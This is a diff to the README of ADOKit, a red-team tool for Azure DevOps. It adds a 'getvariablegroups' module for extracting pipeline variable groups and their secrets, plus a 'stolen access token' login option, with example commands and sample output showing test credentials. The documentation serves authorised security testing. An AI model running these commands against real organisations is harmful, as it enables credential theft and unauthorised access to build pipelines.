@@ -60,6 +60,7 @@ Full details on the techniques used by ADOKit are in the X-Force Red [whitepaper
     - [Remove Collection Service Account](#remove-collection-service-account)
     - [Get Pipeline Variables](#get-pipeline-variables)
     - [Get Pipeline Secrets](#get-pipeline-secrets)
+	- [Get Variable Groups](#get-variable-groups)
     - [Get Service Connections](#get-service-connections)
 - [Detection](#detection)
 - [Roadmap](#roadmap)
@@ -131,6 +132,7 @@ Take the below steps to setup Visual Studio in order to compile the project your
   * <b>removecollectionsvc</b> - Remove a user from the "Project Collection Service Accounts" group
   * <b>getpipelinevars</b> - Retrieve any pipeline variables used for a given project.
   * <b>getpipelinesecrets</b> - Retrieve the names of any pipeline secrets used for a given project.
+  * <b>getvariablegroups</b> - Retrieve any variable groups and the corresponding variables used for a given project.
   * <b>getserviceconnections</b> - Retrieve the service connections used for a given project.
 
 
@@ -152,6 +154,10 @@ Below are the authentication options you have with ADOKit when authenticating to
   * `/credential:UserAuthentication=ABC123`
 * **Personal Access Token (PAT)** - This will be an access token/API key that will be a single string.
   * `/credential:apiToken`
+* **Stolen Access Token** - If you can steal or refresh a suitable access token you can also use it.
+  * `/credential:accessToken`
+
+Note: When using an access token, it must be valid for the resource Azure RM (i.e. "aud":"https://management.core.windows.net/").
 
 ## Module Details Table
 The below table shows the permissions required for each module.
@@ -192,6 +198,7 @@ Privilege Escalation | `addcollectionsvc` |  Yes - `Project Collection Administr
 Privilege Escalation | `removecollectionsvc` |  Yes - `Project Collection Administrator` or `Project Collection Service Accounts` | 
 Privilege Escalation | `getpipelinevars` | Yes - `Contributors` or `Readers` or `Build Administrators` or `Project Administrators` or `Project Team Member` or `Project Collection Test Service Accounts` or `Project Collection Build Service Accounts` or `Project Collection Build Administrators` or `Project Collection Service Accounts` or `Project Collection Administrators` |
 Privilege Escalation | `getpipelinesecrets` |  Yes - `Contributors` or `Readers` or `Build Administrators` or `Project Administrators` or `Project Team Member` or `Project Collection Test Service Accounts` or `Project Collection Build Service Accounts` or `Project Collection Build Administrators` or `Project Collection Service Accounts` or `Project Collection Administrators` | 
+Privilege Escalation | `getvariablegroups` |  Yes - `Contributors` or `Readers` or `Build Administrators` or `Project Administrators` or `Project Team Member` or `Project Collection Test Service Accounts` or `Project Collection Build Service Accounts` or `Project Collection Build Administrators` or `Project Collection Service Accounts` or `Project Collection Administrators` |
 Privilege Escalation | `getserviceconnections` |  Yes - `Project Administrator`, `Project Collection Administrator` or `Project Collection Service Accounts` | 
 
 
@@ -1778,6 +1785,52 @@ Timestamp:      4/10/2023 10:28:37 AM
                     secretpass |             [HIDDEN]
 
 4/10/23 14:28:38 Finished execution of getpipelinesecrets
+
+```
+
+### Get Variable Groups
+
+#### Use Case
+
+> *Extract any variable group and the corresponding variables being used in project(s), which could contain credentials or other useful information.*
+
+#### Syntax
+
+Provide the `getvariablegroups` module along with a `/project:` for a given project to extract any variable groups being used. If you would like to extract variables groups from all projects specify `all` in the `/project:` argument.
+
+`ADOKit.exe getvariablegroups /credential:apiKey /url:https://dev.azure.com/organizationName /project:"someProject"`
+
+`ADOKit.exe getvariablegroups /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/organizationName /project:"someProject"`
+
+`ADOKit.exe getvariablegroups /credential:apiKey /url:https://dev.azure.com/organizationName /project:"all"`
+
+`ADOKit.exe getvariablegroups /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/organizationName /project:"all"`
+
+#### Example Output
+
+```
+C:\>ADOKit.exe getvariablegroups /credential:"ABC123" /url:https://dev.azure.com/YourOrganization /project:"ADOKit"
+
+==================================================
+Module:         getvariablegroups
+Auth Type:      Cookie
+Project:        ADOKit
+Target URL:     https://dev.azure.com/YourOrganization
+
+Timestamp:      16/05/2024 16:53:31
+==================================================
+
+
+[*] INFO: Checking credentials provided
+
+[+] SUCCESS: Credentials provided are VALID.
+
+           Variable Group Name |                  Variable Name |                                     Variable Value
+--------------------------------------------------------------------------------------------------------------------
+           real-test-variables |                  test_password |                                      BurpIsNotBeef
+           real-test-variables |                      test_user |                                            nicolas
+           fake-prod-variables |                    SUPERSECRET |                                           [HIDDEN]
+           fake-prod-variables |                 SUPERNOTSECRET |                             ThisShouldBeSecured :/
 
 ```
 
